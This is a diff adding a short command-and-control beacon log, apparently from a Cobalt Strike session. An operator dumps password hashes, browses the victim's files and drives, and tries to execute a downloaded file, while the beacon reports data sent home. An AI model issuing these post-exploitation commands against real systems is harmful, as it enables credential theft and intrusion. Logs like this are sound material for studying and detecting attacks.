@@ -1,0 +1,18 @@
+10/06 13:52:13 UTC [metadata] 192.168.1.30 <- 192.168.1.30; computer: LORIS-DESKTOP; user: loris *; process: beacon_x64.exe; pid: 40092; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+10/06 13:54:11 UTC [input] <heros3c> hashdump
+10/06 13:54:12 UTC [task] <T1003, T1055, T1093> Tasked beacon to dump hashes
+10/06 13:55:07 UTC [checkin] host called home, sent: 82541 bytes
+10/06 13:55:27 UTC [task] <> Tasked beacon to list files in . (from File Browser)
+10/06 13:55:51 UTC [task] <> Tasked beacon to list drives (from File Browser)
+10/06 13:56:23 UTC [checkin] host called home, sent: 31 bytes
+10/06 13:56:23 UTC [output]
+received password hashes:
+[-] no results.
+
+10/06 13:57:24 UTC [checkin] host called home, sent: 1734 bytes
+10/06 13:57:57 UTC [task] <> Tasked beacon to list files in C:\ (from File Browser)
+10/06 13:58:24 UTC [checkin] host called home, sent: 20 bytes
+10/06 13:58:36 UTC [input] <heros3c> execute C:\Users\loris\Downloads\download.png
+10/06 13:58:36 UTC [task] <T1106> Tasked beacon to execute: C:\Users\loris\Downloads\download.png
+10/06 13:59:24 UTC [checkin] host called home, sent: 45 bytes
+10/06 13:59:24 UTC [error] could not spawn C:\Users\loris\Downloads\download.png: 193 - ERROR_BAD_EXE_FORMAT
